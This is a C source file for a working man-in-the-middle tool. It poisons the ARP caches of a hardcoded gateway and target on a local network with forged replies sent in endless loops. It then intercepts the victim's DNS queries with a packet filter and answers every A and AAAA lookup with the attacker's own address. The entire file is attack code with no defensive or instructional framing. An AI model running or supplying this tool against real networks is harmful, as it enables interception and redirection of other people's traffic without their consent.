//Needed to get ether_arp to resolve proper size
#define _DEFAULT_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/filter.h>
#include <linux/if.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <netdb.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/param.h>
#include <sys/raw.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define INTERFACE_NAME "enp0s31f6"
//#define INTERFACE_NAME "wlp2s0"

#define GATEWAY_IP "192.168.0.1"
#define TARGET_IP "192.168.0.6"

struct thread_arg {
    int sock;
    unsigned char* victim_mac;
    uint32_t victim_ip;
};

//Filter code for not localhost udp port 53
struct sock_filter dns_filter[] = {
        {0x28, 0, 0, 0x0000000c},
        {0x15, 0, 22, 0x000086dd},
        {0x20, 0, 0, 0x00000016},
        {0x15, 0, 6, 0x00000000},
        {0x20, 0, 0, 0x0000001a},
        {0x15, 0, 4, 0x00000000},
        {0x20, 0, 0, 0x0000001e},
        {0x15, 0, 2, 0x00000000},
        {0x20, 0, 0, 0x00000022},
        {0x15, 29, 0, 0x00000001},
        {0x20, 0, 0, 0x00000026},
        {0x15, 0, 6, 0x00000000},
        {0x20, 0, 0, 0x0000002a},
        {0x15, 0, 4, 0x00000000},
        {0x20, 0, 0, 0x0000002e},
        {0x15, 0, 2, 0x00000000},
        {0x20, 0, 0, 0x00000032},
        {0x15, 21, 0, 0x00000001},
        {0x30, 0, 0, 0x00000014},
        {0x15, 0, 19, 0x00000011},
        {0x28, 0, 0, 0x00000036},
        {0x15, 16, 0, 0x00000035},
        {0x28, 0, 0, 0x00000038},
        {0x15, 14, 15, 0x00000035},
        {0x15, 0, 14, 0x00000800},
        {0x20, 0, 0, 0x0000001a},
        {0x15, 12, 0, 0x7f000001},
        {0x20, 0, 0, 0x0000001e},
        {0x15, 10, 0, 0x7f000001},
        {0x30, 0, 0, 0x00000017},
        {0x15, 0, 8, 0x00000011},
        {0x28, 0, 0, 0x00000014},
        {0x45, 6, 0, 0x00001fff},
        {0xb1, 0, 0, 0x0000000e},
        {0x48, 0, 0, 0x0000000e},
        {0x15, 2, 0, 0x00000035},
        {0x48, 0, 0, 0x00000010},
        {0x15, 0, 1, 0x00000035},
        {0x6, 0, 0, 0x00040000},
        {0x6, 0, 0, 0x00000000},
};

struct sock_fprog port_filter
        = {.len = (sizeof(dns_filter) / sizeof(dns_filter[0])), .filter = dns_filter};

unsigned char local_mac[6];
int local_interface_index;

unsigned char gateway_mac[6];
unsigned char target_mac[6];

uint32_t local_ip;
unsigned char local_ip_6[16];

uint32_t gateway_ip;
uint32_t target_ip;

void get_local_mac(int sock) {
    struct ifreq s;
    memset(&s, 0, sizeof(struct ifreq));
    strcpy(s.ifr_name, INTERFACE_NAME);

    if (ioctl(sock, SIOCGIFHWADDR, &s)) {
        perror("ioctl local mac");
        exit(EXIT_FAILURE);
    }
    memcpy(local_mac, s.ifr_addr.sa_data, 6);
    printf("Local mac address is: ");
    for (int i = 0; i < 6; ++i) {
        printf("%02x", (unsigned char) s.ifr_addr.sa_data[i]);
    }
    printf("\n");

    if (ioctl(sock, SIOCGIFADDR, &s)) {
        perror("ioctl local ip");
        exit(EXIT_FAILURE);
    }

    memcpy(&local_ip, &((struct sockaddr_in*) &s.ifr_addr)->sin_addr.s_addr, sizeof(uint32_t));
    printf("Local IP address is: %08x\n", local_ip);

    if (ioctl(sock, SIOCGIFINDEX, &s)) {
        perror("ioctl local ip");
        exit(EXIT_FAILURE);
    }

    local_interface_index = s.ifr_ifindex;
    printf("Local interface index is: %08x\n", local_interface_index);

    FILE* f = fopen("/proc/net/if_inet6", "r");
    if (!f) {
        perror("/proc/net/if_inet6 open");
        exit(EXIT_FAILURE);
    }

    unsigned int tmp1, tmp2;
    char dname[256];
    while (fscanf(f,
                   " %2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%"
                   "2hhx%2hhx %*x %x %x %*x %s",
                   &local_ip_6[0], &local_ip_6[1], &local_ip_6[2], &local_ip_6[3], &local_ip_6[4],
                   &local_ip_6[5], &local_ip_6[6], &local_ip_6[7], &local_ip_6[8], &local_ip_6[9],
                   &local_ip_6[10], &local_ip_6[11], &local_ip_6[12], &local_ip_6[13],
                   &local_ip_6[14], &local_ip_6[15], &tmp1, &tmp2, dname)
            == 19) {
        if (strcmp(INTERFACE_NAME, dname) != 0) {
            continue;
        } else {
            break;
        }
    }

    fclose(f);

    printf("Local IPv6 address: ");
    for (int i = 0; i < 16; ++i) {
        printf("%02x", local_ip_6[i]);
    }
    printf("\n");
}

void ping_ip(const char* ip) {
    char combined[200];
    memset(combined, 0, 200);
    snprintf(combined, 199, "ping -c 1 %s > /dev/null 2> /dev/null", ip);
    system(combined);
}

uint32_t convert_ip_to_int(const char* ip) {
    unsigned int a, b, c, d;
    sscanf(ip, "%u.%u.%u.%u", (unsigned int*) &a, (unsigned int*) &b, (unsigned int*) &c,
            (unsigned int*) &d);
    return a | (b << 8) | (c << 16) | (d << 24);
}

int get_mac_from_ip(int sock, const char* ip, unsigned char* out_mac) {
    if (!fork()) {
        ping_ip(ip);
        exit(EXIT_SUCCESS);
    }

    unsigned char buffer[65535];

    struct ether_header* eh = (struct ether_header*) buffer;
    struct iphdr* iph = (struct iphdr*) (buffer + sizeof(struct ether_header));

    uint32_t ip_int = convert_ip_to_int(ip);

    int size;
    while ((size = read(sock, buffer, 65535)) > 0) {
        //Check packet type
        if (size < 40) {
            //Size is too low
            continue;
        }
        if (iph->daddr == ip_int) {
            //Write out the found mac address
            memcpy(out_mac, eh->ether_dhost, 6);
            return 0;
        }
    }
    return -errno;
}

int create_packet_socket(void) {
    int pack_sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    //Set to promiscuous mode
    struct ifreq ifopts;
    strncpy(ifopts.ifr_name, INTERFACE_NAME, IFNAMSIZ - 1);
    ioctl(pack_sock, SIOCGIFFLAGS, &ifopts);
    ifopts.ifr_flags |= IFF_PROMISC;
    ioctl(pack_sock, SIOCSIFFLAGS, &ifopts);

    return pack_sock;
}

void* flood_arp(void* ta) {
    const struct thread_arg* args = (const struct thread_arg*) ta;
    const int sock = args->sock;
    const unsigned char* victim_mac = args->victim_mac;
    const uint32_t victim_ip = args->victim_ip;

    unsigned char buffer[sizeof(struct ether_arp) + sizeof(struct ether_arp)];
    memset(buffer, 0, sizeof(struct ether_arp) + sizeof(struct ether_arp));

    struct ether_header* eh = (struct ether_header*) buffer;
    struct ether_arp* ea = (struct ether_arp*) (buffer + sizeof(struct ether_header));
    //Set target mac address
    memcpy(eh->ether_dhost, victim_mac, 6);
    //Set sender mac address
    memcpy(eh->ether_shost, local_mac, 6);
    eh->ether_type = htons(ETH_P_ARP);

    //Ethernet
    ea->arp_hrd = htons(ARPHRD_ETHER);
    //IPv4
    ea->arp_pro = htons(ETH_P_IP);
    //Hardware len
    ea->arp_hln = ETHER_ADDR_LEN;
    //Protocol len
    ea->arp_pln = sizeof(in_addr_t);

    //ARP reply
    ea->arp_op = htons(ARPOP_REPLY);
    //ea->arp_op = htons(2);

    //Set sender mac address
    memcpy(ea->arp_sha, local_mac, 6);

    //Set sender IP address
    memcpy(ea->arp_spa, (victim_ip == gateway_ip) ? &target_ip : &gateway_ip, 4);

    //Set target mac address
    memcpy(ea->arp_tha, victim_mac, 6);

    //Set target IP address
    memcpy(ea->arp_tpa, &victim_ip, 4);

    struct sockaddr_ll addr = {0};
    addr.sll_family = AF_PACKET;
    addr.sll_ifindex = local_interface_index;
    addr.sll_halen = ETHER_ADDR_LEN;
    addr.sll_protocol = htons(ETH_P_ARP);
    memcpy(addr.sll_addr, victim_mac, ETHER_ADDR_LEN);

    for (;;) {
        sendto(sock, buffer, sizeof(struct ether_header) + sizeof(struct ether_arp), 0,
                (struct sockaddr*) &addr, sizeof(struct sockaddr_ll));
        sleep(1);
    }
    return NULL;
}

//https://stackoverflow.com/questions/32750903/ip-checksum-calculating
void compute_ip_checksum(struct iphdr* ip) {
    unsigned short* begin = (unsigned short*) ip;
    unsigned short* end = begin + 5 / 2;
    unsigned int checksum = 0, first_half, second_half;

    ip->check = 0;
    for (; begin != end; begin++) {
        checksum += *begin;
    }

    first_half = (unsigned short) (checksum >> 16);
    while (first_half) {
        second_half = (unsigned short) ((checksum << 16) >> 16);
        checksum = first_half + second_half;
        first_half = (unsigned short) (checksum >> 16);
    }

    ip->check = ~checksum;
}

//http://minirighi.sourceforge.net/html/ip_8c-source.html
unsigned short csum(unsigned short* buf, int nwords) {
    unsigned long sum = 0;
    const uint16_t* ip1;

    ip1 = buf;
    while (nwords > 1) {
        sum += *ip1++;
        if (sum & 0x80000000) {
            sum = (sum & 0xFFFF) + (sum >> 16);
        }
        nwords -= 2;
    }

    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    return (~sum);
}

unsigned int checksum(uint16_t* usBuff, int isize) {
    unsigned int cksum = 0;
    for (; isize > 1; isize -= 2) {
        cksum += *usBuff++;
    }
    if (isize == 1) {
        cksum += *(uint16_t*) usBuff;
    }

    return (cksum);
}

// calculate udp checksum
uint16_t check_udp_sum(uint8_t* buffer, int len) {
    unsigned long sum = 0;
    struct iphdr* tempI = (struct iphdr*) (buffer);
    struct udphdr* tempH = (struct udphdr*) (buffer + sizeof(struct iphdr));
    tempH->check = 0;
    sum = checksum((uint16_t*) &(tempI->saddr), 8);
    sum += checksum((uint16_t*) tempH, len);

    sum += ntohs(IPPROTO_UDP + len);

    sum = (sum >> 16) + (sum & 0x0000ffff);
    sum += (sum >> 16);

    return (uint16_t)(~sum);
}

void spoof_dns(int sock) {
    unsigned char buffer[65535];
    struct ether_header* eh = (struct ether_header*) buffer;
    struct iphdr* ih = (struct iphdr*) (buffer + sizeof(struct ether_header));
    struct udphdr* uh
            = (struct udphdr*) (buffer + sizeof(struct ether_header) + sizeof(struct iphdr));
    unsigned char* data
            = (buffer + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr));

    unsigned char recv_buffer[65535];
    struct ether_header* recv_eh = (struct ether_header*) recv_buffer;
    struct iphdr* recv_ih = (struct iphdr*) (recv_buffer + sizeof(struct ether_header));
    struct udphdr* recv_uh
            = (struct udphdr*) (recv_buffer + sizeof(struct ether_header) + sizeof(struct iphdr));
    unsigned char* recv_data = (recv_buffer + sizeof(struct ether_header) + sizeof(struct iphdr)
            + sizeof(struct udphdr));

    //Initial constant packet settings
    //Zero buffer for defaults
    memset(buffer, 0xff, 65535);

    eh->ether_type = htons(ETH_P_IP);
    memcpy(eh->ether_shost, gateway_mac, ETHER_ADDR_LEN);

    int size;
    int data_len = 60;
    while ((size = read(sock, recv_buffer, 65535)) > 0) {
        if (ntohs(recv_uh->dest) != 53 || ntohs(recv_uh->source) == 53) {
            continue;
        }
        printf("Read outgoing dns request\n");
        //Destination is received source mac
        memcpy(eh->ether_dhost, recv_eh->ether_shost, ETHER_ADDR_LEN);

        //IP stuffs
        ih->version = 4;
        ih->ihl = 5;
        ih->protocol = IPPROTO_UDP;
        ih->saddr = recv_ih->daddr;
        ih->daddr = recv_ih->saddr;
        ih->id = htons(ntohs(recv_ih->id) + 1);
        ih->ttl = recv_ih->ttl;
        ih->tos = 0;
        ih->frag_off = htons(0x4000);

        //UDP stuffs
        uh->source = recv_uh->dest;
        uh->dest = recv_uh->source;

        //DNS stuffs
        //Transaction ID
        memcpy(data, recv_data, 2);
        //Set response flags to 0x8580
        //data[2] = 0x85;
        data[2] = 0x81;
        data[3] = 0x80;

        //Copy number of questions
        memcpy(data + 4, recv_data + 4, 2);

        //1 answer RR
        data[6] = 0x00;
        data[7] = 0x01;

        //Zero authority or additional RR
        memset(data + 8, 0, 4);

        //Time to parse question string
        int name_len = 0;
        int section_count = 0;
        for (;;) {
            if (recv_data[12 + name_len + section_count] == 0x00) {
                break;
            }
            name_len += recv_data[12 + name_len + section_count++];
        }
        name_len += section_count;
        memcpy(data + 12, recv_data + 12, name_len);

        //NULL terminate name
        data[12 + name_len + 0] = 0x00;

        if (recv_data[12 + name_len + 2] == 0x1c) {
            printf("AAAA record\n");
            //AAAA request
            //AAAA record, IN address
            data[12 + name_len + 1] = 0x00;
            data[12 + name_len + 2] = 0x1c;
            data[12 + name_len + 3] = 0x00;
            data[12 + name_len + 4] = 0x01;

            //Compress name via pointer to question name string
            data[12 + name_len + 5] = 0xc0;
            //12 bytes offset
            data[12 + name_len + 6] = 0x0c;

            //Type A, IN address
            data[12 + name_len + 7] = 0x00;
            data[12 + name_len + 8] = 0x1c;
            data[12 + name_len + 9] = 0x00;
            data[12 + name_len + 10] = 0x01;

            //TTL = 7200
            data[12 + name_len + 11] = 0x00;
            data[12 + name_len + 12] = 0x00;
            data[12 + name_len + 13] = 0x1c;
            data[12 + name_len + 14] = 0x20;

            //Data length = 16
            data[12 + name_len + 15] = 0x00;
            data[12 + name_len + 16] = 0x10;

            //Set ipv6 address
            memcpy(data + 12 + name_len + 17, &local_ip_6, 16);

            //Set DNS packet length
            data_len = 45 + name_len;
        } else {
            //A request
            //A record, IN address
            data[12 + name_len + 1] = 0x00;
            data[12 + name_len + 2] = 0x01;
            data[12 + name_len + 3] = 0x00;
            data[12 + name_len + 4] = 0x01;

            //Compress name via pointer to question name string
            data[12 + name_len + 5] = 0xc0;
            //12 bytes offset
            data[12 + name_len + 6] = 0x0c;

            //Type A, IN address
            data[12 + name_len + 7] = 0x00;
            data[12 + name_len + 8] = 0x01;
            data[12 + name_len + 9] = 0x00;
            data[12 + name_len + 10] = 0x01;

            //TTL = 7200
            data[12 + name_len + 11] = 0x00;
            data[12 + name_len + 12] = 0x00;
            data[12 + name_len + 13] = 0x1c;
            data[12 + name_len + 14] = 0x20;

            //Data length = 4
            data[12 + name_len + 15] = 0x00;
            data[12 + name_len + 16] = 0x04;

            memcpy(data + 12 + name_len + 17, &local_ip, 4);

            //Set DNS packet length
            data_len = 33 + name_len;
        }
        //Set IP len
        ih->tot_len = htons(20 + sizeof(struct udphdr) + data_len);
        //Calculate IP checksum
        ih->check = 0;
        ih->check = csum((unsigned short*) ih, sizeof(struct iphdr));

        //Set UDP len
        uh->len = htons(data_len + sizeof(struct udphdr));

        //Calculate UDP checksum
        uh->check = 0;
        uh->check = check_udp_sum((unsigned char *) ih, ntohs(uh->len));

        struct sockaddr_ll addr = {0};
        addr.sll_family = AF_PACKET;
        addr.sll_ifindex = local_interface_index;
        addr.sll_halen = ETHER_ADDR_LEN;
        addr.sll_protocol = htons(ETH_P_IP);
        memcpy(addr.sll_addr, &ih->daddr, ETHER_ADDR_LEN);

        sendto(sock, buffer,
                sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr)
                        + data_len,
                0, (struct sockaddr*) &addr, sizeof(struct sockaddr_ll));
        printf("Spoofed dns response\n");
    }
    if (size == -1) {
        perror("dns read");
        exit(EXIT_FAILURE);
    }
}

int main(void) {
    if (setuid(0)) {
        perror("setuid");
        exit(EXIT_FAILURE);
    }
    if (setgid(0)) {
        perror("setgid");
        exit(EXIT_FAILURE);
    }

    //Zero out to detect if they've been set
    memset(gateway_mac, 0, 6);
    memset(target_mac, 0, 6);

    gateway_ip = convert_ip_to_int(GATEWAY_IP);
    target_ip = convert_ip_to_int(TARGET_IP);

    int pack_sock = create_packet_socket();

    get_local_mac(pack_sock);

    printf("%08x\n", gateway_ip);
    printf("%08x\n", target_ip);

    if (get_mac_from_ip(pack_sock, GATEWAY_IP, gateway_mac)) {
        perror("Initial gateway mac read");
        exit(EXIT_FAILURE);
    }
    printf("%02x %02x %02x %02x %02x %02x\n", gateway_mac[0], gateway_mac[1], gateway_mac[2],
            gateway_mac[3], gateway_mac[4], gateway_mac[5]);
    if (get_mac_from_ip(pack_sock, TARGET_IP, target_mac)) {
        perror("Initial gateway mac read");
        exit(EXIT_FAILURE);
    }
    printf("%02x %02x %02x %02x %02x %02x\n", target_mac[0], target_mac[1], target_mac[2],
            target_mac[3], target_mac[4], target_mac[5]);

#if 1
    struct thread_arg ta;
    ta.sock = pack_sock;
    ta.victim_mac = gateway_mac;
    ta.victim_ip = gateway_ip;

    pthread_t one;
    pthread_t two;

    pthread_create(&one, NULL, flood_arp, &ta);

    struct thread_arg tb;
    tb.sock = pack_sock;
    tb.victim_mac = target_mac;
    tb.victim_ip = target_ip;

    pthread_create(&two, NULL, &flood_arp, &tb);
#endif

    if (setsockopt(pack_sock, SOL_SOCKET, SO_ATTACH_FILTER, &port_filter, sizeof(port_filter))
            < 0) {
        perror("packet filter");
        goto finish;
    }

    spoof_dns(pack_sock);

finish:
    pthread_join(one, NULL);
    pthread_join(two, NULL);

    close(pack_sock);

    return EXIT_SUCCESS;
}
